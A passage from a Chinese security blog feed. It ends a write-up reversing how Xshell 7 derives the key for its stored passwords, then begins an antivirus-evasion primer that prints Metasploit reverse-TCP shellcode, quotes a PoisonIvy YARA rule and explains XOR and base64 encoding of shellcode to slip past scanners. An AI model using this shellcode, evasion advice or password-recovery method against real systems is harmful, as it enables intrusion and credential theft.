class="keyword">uint32_t</span>)(ctx-&gt;len[<span class="number">0</span>] &amp; <span class="number">63</span>), j = ((~i) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    BSWP(ctx-&gt;buf, (i + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ctx-&gt;buf[i &gt;&gt; <span class="number">2</span>] &amp;= <span class="number">0xffffff80</span> &lt;&lt; j;  <span class="comment">/* add padding */</span></span><br><span class="line">    ctx-&gt;buf[i &gt;&gt; <span class="number">2</span>] |= <span class="number">0x00000080</span> &lt;&lt; j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">56</span>) i = (i &gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> ctx-&gt;buf[<span class="number">15</span>] ^= (i &lt; <span class="number">60</span>) ? ctx-&gt;buf[<span class="number">15</span>] : <span class="number">0</span>, _hash(ctx), i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">14</span>) ctx-&gt;buf[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;buf[<span class="number">14</span>] = (ctx-&gt;len[<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) | (ctx-&gt;len[<span class="number">0</span>] &gt;&gt; <span class="number">29</span>); <span class="comment">/* add length */</span></span><br><span class="line">    ctx-&gt;buf[<span class="number">15</span>] = ctx-&gt;len[<span class="number">0</span>] &lt;&lt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    _hash(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        ctx-&gt;buf[i % <span class="number">16</span>] = <span class="number">0</span>, <span class="comment">/* may remove this line in case of a DIY cleanup */</span></span><br><span class="line">        buf[i] = (<span class="keyword">uint8_t</span>)(ctx-&gt;hash[i &gt;&gt; <span class="number">2</span>] &gt;&gt; ((~i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h4 id="sha256-h"><a href="#sha256-h" class="headerlink" title="sha256.h"></a>sha256.h</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> uint8_t</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int8 <span class="keyword">uint8_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> uint32_t</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int32 <span class="keyword">uint32_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> uint64_t</span></span><br><span class="line"><span class="keyword">typedef</span> __int64 <span class="keyword">int64_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> __int64 <span class="keyword">uint64_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint32_t</span> buf[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> hash[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> len[<span class="number">2</span>];</span><br><span class="line">    &#125; sha256_context;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sha256_init</span><span class="params">(sha256_context*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sha256_hash</span><span class="params">(sha256_context*, <span class="keyword">uint8_t</span>* <span class="comment">/* data */</span>, <span class="keyword">uint32_t</span> <span class="comment">/* len */</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sha256_done</span><span class="params">(sha256_context*, <span class="keyword">uint8_t</span>* <span class="comment">/* hash */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//base64解码</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base64_decode</span><span class="params">(<span class="keyword">char</span>* code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//根据base64表，以字符找到对应的十进制数据  </span></span><br><span class="line">    <span class="keyword">int</span> table[] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">             <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">             <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">             <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">             <span class="number">63</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,</span><br><span class="line">             <span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">             <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,</span><br><span class="line">             <span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">             <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>,</span><br><span class="line">             <span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,</span><br><span class="line">             <span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,</span><br><span class="line">             <span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">long</span> len;</span><br><span class="line">    <span class="keyword">long</span> str_len;</span><br><span class="line">    <span class="keyword">char</span>* res;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算解码后的字符串长度  </span></span><br><span class="line">    len = <span class="built_in">strlen</span>(code);</span><br><span class="line">    <span class="comment">//判断编码后的字符串后是否有=  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">&quot;==&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(code, <span class="string">&quot;=&quot;</span>))</span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    res = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>) * str_len + <span class="number">1</span>);</span><br><span class="line">    res[str_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//以4个字符为一位进行解码  </span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; j += <span class="number">3</span>, i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res[j] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i]]) &lt;&lt; <span class="number">2</span> | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i + <span class="number">1</span>]]) &gt;&gt; <span class="number">4</span>); <span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  </span></span><br><span class="line">        res[j + <span class="number">1</span>] = (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i + <span class="number">1</span>]]) &lt;&lt; <span class="number">4</span>) | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i + <span class="number">2</span>]]) &gt;&gt; <span class="number">2</span>); <span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  </span></span><br><span class="line">        res[j + <span class="number">2</span>] = (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i + <span class="number">2</span>]]) &lt;&lt; <span class="number">6</span>) | ((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i + <span class="number">3</span>]]); <span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看下效果图</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220218010100008.png" alt="image-20220218010100008"></p>
<h1 id="0x03-xshell7-本地密码算法逆向分析"><a href="#0x03-xshell7-本地密码算法逆向分析" class="headerlink" title="0x03 xshell7 本地密码算法逆向分析"></a>0x03 xshell7 本地密码算法逆向分析</h1><p>2.23更新</p>
<p>首先看下xshell程序的组成，除了exe外，还有这么多的dll文件，而我们想要的是他的本地配置文件中明文密码的加密算法。但是这么多dll文件，我怎么知道加密算法在哪个dll文件中啊。</p>
<p>我比较笨，没有更好的方法，只能一个个看dll。先排除几个dll，比如 <code>jsoncpp.dll</code> 应该是存储数据的，<code>nsactivate.dll</code>应该是激活程序的，<code>nslicense.dll</code>应该和证书有关，<code>nsprofile2.dll</code>配置文件，可能与加密算法有关，<code>nsresource.dll</code>差不多是一些乱七八糟的资源文件……当然上面都是我个人的猜测。按照这个思路，这些dll放在后面考虑。</p>
<p>另外，根据 xshell5 和 xshell6 加密算法来看，加密算法离不开 <code>sha256、RC4、md5、base64</code>这些函数，那我们就先过滤下这些字符串。</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220133607718.png" alt="image-20220220133607718"></p>
<p>按照这个思路，运气很好。看来离目标不远了。</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220135047929.png" alt="image-20220220135047929"></p>
<p>同时在该dll文件的导出表中发现了base64，狂喜</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220135209809.png" alt="image-20220220135209809"></p>
<p>话不多说，直接梭</p>
<p>将 <code>Password</code> push 入栈 ，同时还有 <code>Public key</code></p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220140747397.png" alt="image-20220220140747397"></p>
<p>证明下确实是版本7  哈哈哈哈哈</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220141519174.png" alt="image-20220220141519174"></p>
<p>也注意到里面定义的变量都是 <code>wchar_t</code>型的，这也解释了为什么最初读文件时读的内容会乱码的问题，还要进行一步的宽字节转换。 </p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220141554576.png" alt="image-20220220141554576"></p>
<p>获取当前域名</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220151306755.png" alt="image-20220220151306755"></p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220151702555.png" alt="image-20220220151702555"></p>
<p>先进行变量初始化， 接着获取域名等变量，</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220151950178.png" alt="image-20220220151950178"></p>
<p>fine，终于找到了！！！ 前面说的都是屁话。正文开始</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220152834018.png" alt="image-20220220152834018"></p>
<p>这里很明显，<code>GetUserNameW</code>获取当前用户名，<code>ConvertSidToStringSidW</code>获取当前用户的sid</p>
<p>而且做了版本的判断</p>
<p><img src="/2022/02/18/xshell%E6%A1%86%E6%9E%B6/image-20220220153910884.png" alt="image-20220220153910884"></p>
<p>我们先看 版本6的情况（&gt;5.2），</p>
<p>a1 :  当前用户名</p>
<p>StringSid：当前用户的sid</p>
<p>在6的情况下，看到 返回的结果是 a1+StringSid 的拼接值 。</p>
<p>而在版本7，先进行了用户名的逆序，再进行用户名和sid的拼接，最终的返回值是  <code>sid的逆序与用户名的拼接</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 0range</span><br><span class="line"># egnar0</span><br><span class="line"># egnar0S-1-5-21-3783662542-2430270289</span><br><span class="line"># 9820720342-245266387-21-5-1-S0range  -&gt; return</span><br></pre></td></tr></table></figure>

<p>返回值作为 RC4 的密钥 </p>
<p>其余和旧版本都不变。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个工具开发了一个多星期，期间几位师傅指导了我很多。体会到了改bug的快乐，也希望自己也能早日成为一名coder。明天就回学校了，下一阶段学习应该是免杀为主，但很多东西不能发，哎。希望也能多多输出文章吧。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>工具开发</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>开发</tag>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀基础入门篇</title>
    <url>/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<p>本文首发于先知社区，原文链接：<a href="https://xz.aliyun.com/t/10369">https://xz.aliyun.com/t/10369</a></p>
<span id="more"></span>

<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>浅析杀软原理及一些绕过思路，也是我自己学习的一点笔记和思路。</p>
<p>杀软原理：</p>
<h3 id="0x01-静态查杀"><a href="#0x01-静态查杀" class="headerlink" title="0x01 静态查杀:"></a>0x01 静态查杀:</h3><h5 id="1-特征码识别"><a href="#1-特征码识别" class="headerlink" title="1.特征码识别:"></a>1.特征码识别:</h5><p>杀软有自己的病毒库，里面有很多样本，扫描时会抽取扫描对象的一段特征并与病毒库里作比较，如果匹配，那就会认为是病毒。抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面又不要有太大的空间与时间的开销。如果一种病毒的特征代码增长一字节，要检测3000种病毒，增加的空间就是3000字节。在保持唯一性的前提下，尽量使特征代码长度短些，以减少空间与时间开销。</p>
<p>主要扫描的有：</p>
<p><code>hash、文件名、函数名、敏感字符串、敏感api等等</code></p>
<h5 id="2-云查杀"><a href="#2-云查杀" class="headerlink" title="2.云查杀:"></a>2.云查杀:</h5><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，意思是只要联网病毒库就会同步更新，这种病毒库更加强大。</p>
<h5 id="3-校验和法"><a href="#3-校验和法" class="headerlink" title="3.校验和法"></a>3.校验和法</h5><p>根据正常文件的内容，计算其校验和，定期不定期的检查文件的校验是否与正常的校验和一样。其实本质还是特征码，万变不离其宗</p>
<h5 id="4-启发式扫描："><a href="#4-启发式扫描：" class="headerlink" title="4.启发式扫描："></a>4.启发式扫描：</h5><p>但是面对未知的病毒，换个模样杀软就认不出了吗？所以安全厂商研究出了启发式算法</p>
<p>启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这就是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀病毒。</p>
<p>eg：</p>
<p>这是msf的shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span><br><span class="line">; Compatible: Windows 7, 2003</span><br><span class="line">; Architecture: x64</span><br><span class="line">;-----------------------------------------------------------------------------;</span><br><span class="line">[BITS 64]</span><br><span class="line"></span><br><span class="line">; Input: RBP must be the address of &#x27;api_call&#x27;.</span><br><span class="line">; Output: RDI will be the socket for the connection to the server</span><br><span class="line">; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15</span><br><span class="line"></span><br><span class="line">reverse_tcp:</span><br><span class="line">  ; setup the structures we need on the stack...</span><br><span class="line">  mov r14, &#x27;ws2_32&#x27;</span><br><span class="line">  push r14               ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.</span><br><span class="line">  mov r14, rsp           ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.</span><br><span class="line">  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)</span><br><span class="line">  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.</span><br><span class="line">  mov r12, 0x0100007F5C110002        </span><br><span class="line">  push r12               ; host 127.0.0.1, family AF_INET and port 4444</span><br><span class="line">  mov r12, rsp           ; save pointer to sockaddr struct for connect call</span><br><span class="line">  ; perform the call to LoadLibraryA...</span><br><span class="line">  mov rcx, r14           ; set the param for the library to load</span><br><span class="line">  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call rbp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  ; perform the call to WSAStartup...</span><br><span class="line">  mov rdx, r13           ; second param is a pointer to this stuct</span><br><span class="line">  push 0x0101            ;</span><br><span class="line">  pop rcx                ; set the param for the version requested</span><br><span class="line">  mov r10d, 0x006B8029   ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call rbp               ; WSAStartup( 0x0101, &amp;WSAData );</span><br><span class="line">  ; perform the call to WSASocketA...</span><br><span class="line">  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.</span><br><span class="line">  push rax               ; push null for reserved parameter</span><br><span class="line">  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  xor r8, r8             ; we do not specify a protocol</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rdx, rax           ; push SOCK_STREAM</span><br><span class="line">  inc rax                ;</span><br><span class="line">  mov rcx, rax           ; push AF_INET</span><br><span class="line">  mov r10d, 0xE0DF0FEA   ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  mov rdi, rax           ; save the socket for later</span><br><span class="line">  ; perform the call to connect...</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  pop r8                 ; pop off the third param</span><br><span class="line">  mov rdx, r12           ; set second param to pointer to sockaddr struct</span><br><span class="line">  mov rcx, rdi           ; the socket</span><br><span class="line">  mov r10d, 0x6174A599   ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call rbp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line">  ; restore RSP so we dont have any alignment issues with the next block...</span><br><span class="line">  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations</span><br></pre></td></tr></table></figure>

<p>可以看到调用了两个dll，ws2_32.dll（实现socket通信，建立攻击机与目标机器的连接），kernel32.dll（ring3级别的dll，存放在C:\windows\system32文件夹中，它控制着系统的内存管理、数据的输入输出操作与中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域）</p>
<p>重点查杀</p>
<p><code>  mov r10d, 0x0726774C   ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</code></p>
<p>为什么？还不是因为它功能强大，是很多病毒爱好者的得力助手，所以被各大杀软盯的很死。</p>
<p>同样，cs中的两个特征 </p>
<p>1.profile中的stage，我这里拿到的是apt的样本，可以看到是加密混淆后的</p>
<p><img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014013837846.png" alt="image-20211014013837846"></p>
<p>2.导出函数 ReflectiveLoader也是在杀软的豪华套餐上的，它是用来导出反射注入的dll，可以修改这个导出函数的名称来进行绕过。</p>
<p>（程序运行时将exe、dll文件加载到内存并执行一些操作的过程，这个过程称为反射，它的优点是不落盘，直接载入目标内存中执行 ，dll放在server端，目标通过下载器直接加载到内存中执行）通常这种反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>ps: 关于更多分析cobalt strike，大家可以去网上看各种魔改的文章。</p>
<h5 id="yara规则："><a href="#yara规则：" class="headerlink" title="yara规则："></a>yara规则：</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">rule PoisonIvy_Generic_3 &#123;</span><br><span class="line">    meta:</span><br><span class="line">        description = <span class="string">&quot;PoisonIvy RAT Generic Rule&quot;</span></span><br><span class="line">        license = <span class="string">&quot;https://creativecommons.org/licenses/by-nc/4.0/&quot;</span></span><br><span class="line">        author = <span class="string">&quot;Florian Roth&quot;</span></span><br><span class="line">        date = <span class="string">&quot;2015-05-14&quot;</span></span><br><span class="line">        hash = <span class="string">&quot;e1cbdf740785f97c93a0a7a01ef2614be792afcd&quot;</span></span><br><span class="line">    strings:</span><br><span class="line">        $k1 = <span class="string">&quot;Tiger324&#123;&quot;</span> fullword ascii</span><br><span class="line"></span><br><span class="line">        $s2 = <span class="string">&quot;WININET.dll&quot;</span> fullword ascii</span><br><span class="line">        $s3 = <span class="string">&quot;mscoree.dll&quot;</span> fullword wide</span><br><span class="line">        $s4 = <span class="string">&quot;WS2_32.dll&quot;</span> fullword</span><br><span class="line">        $s5 = <span class="string">&quot;Explorer.exe&quot;</span> fullword wide</span><br><span class="line">        $s6 = <span class="string">&quot;USER32.DLL&quot;</span></span><br><span class="line">        $s7 = <span class="string">&quot;CONOUT$&quot;</span></span><br><span class="line">        $s8 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line"></span><br><span class="line">        $h1 = <span class="string">&quot;HTTP/1.0&quot;</span></span><br><span class="line">        $h2 = <span class="string">&quot;POST&quot;</span></span><br><span class="line">        $h3 = <span class="string">&quot;login.asp&quot;</span></span><br><span class="line">        $h4 = <span class="string">&quot;check.asp&quot;</span></span><br><span class="line">        $h5 = <span class="string">&quot;result.asp&quot;</span></span><br><span class="line">        $h6 = <span class="string">&quot;upload.asp&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="built_in">uint16</span>(<span class="number">0</span>) == <span class="number">0x5a4d</span> <span class="keyword">and</span> filesize &lt; <span class="number">500</span>KB <span class="built_in"><span class="keyword">and</span></span></span><br><span class="line">            ( </span><br><span class="line">                $k1 <span class="keyword">or</span> all <span class="built_in">of</span> ($s*) <span class="keyword">or</span> all <span class="built_in">of</span> ($h*)</span><br><span class="line">            )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单分析下这段yara规则，标记了hash，最终的匹配规则是 <code>文件大小在500kb以内 并且满足 $k1/all $s/all $h 中的任意一条</code>，即被认定是病毒。这时候就可以根据破坏相应的规则，比如大小改为500kb+，不去调用相应的dll等来 bypass。</p>
<h3 id="静态免杀方法"><a href="#静态免杀方法" class="headerlink" title="静态免杀方法:"></a>静态免杀方法:</h3><p>针对静态查杀的原理，匹配对应的特征识别为病毒，那么我们让杀软识别不出这是病毒不就可以了。给出最简单的两种方式：</p>
<h5 id="MYCCL查找特征码修改："><a href="#MYCCL查找特征码修改：" class="headerlink" title="MYCCL查找特征码修改："></a>MYCCL查找特征码修改：</h5><p>找到杀软查杀的特征码，修改，替换，编码等等在不影响程序运行的情况下，把特征码改的面目全非，删掉也可以。</p>
<p>这个工具算是很老的了，具体使用方法不再阐述。</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015152497.png" alt="image-20211014015152497" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015346016.png" alt="image-20211014015346016" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015412250.png" alt="image-20211014015412250" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015433901.png" alt="image-20211014015433901" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015458302.png" alt="image-20211014015458302" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014015552143.png" alt="image-20211014015552143" style="zoom:67%;">

<p>这里是针对查杀的字符串进行拆分替换。</p>
<p>但是这种定位特征码的办法只能针对本地病毒库，面对云查杀会束手无策，云查杀会产生越来越多的特征码，这种情况可以改为内存加载，在内存里面做免杀，或者利用白加黑…….</p>
<h5 id="对shellcode进行加密编码"><a href="#对shellcode进行加密编码" class="headerlink" title="对shellcode进行加密编码"></a>对shellcode进行加密编码</h5><p>一些编码方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在特定位置添加垃圾字节</span><br><span class="line">2、使用硬编码的单字节密钥对字节进行XOR或者加减法运算</span><br><span class="line">3、将字节移位某些特定位置</span><br><span class="line">4、交换连续字节</span><br></pre></td></tr></table></figure>

<p>涉及到一些密码学的知识，非对称加密比对称加密效果要好，自己可以定义私钥，个人最喜欢异或，简单有效。</p>
<p>比如这里，先对shellcode进行一层异或加密生成decode_shellcode，然后再encode 执行。当然现在这么简单的异或已经不行了，可以多层异或，多个key，改的他妈都不认识。将shellcode写入内存的方法也是多种多样，下文中有提到，这里只讨论加密混淆。当然也可以使用其他加密方式，思路都一样的嘛</p>
<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020038200.png" alt="image-20211014020038200" style="zoom:67%;">

<img src="/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/image-20211014020052793.png" alt="image-20211014020052793" style="zoom:67%;">

<p>下面是GitHub的一个用 base64 混淆的项目，简单说就是将shellcode多层base64编码后，再加载执行，这里加载执行写入内存的方式也是最简单的加载方式。想要效果更好，可以用更强的加密方式，更隐蔽的将shellcode写入内存的方式。</p>
<p>可以看看效果</p>
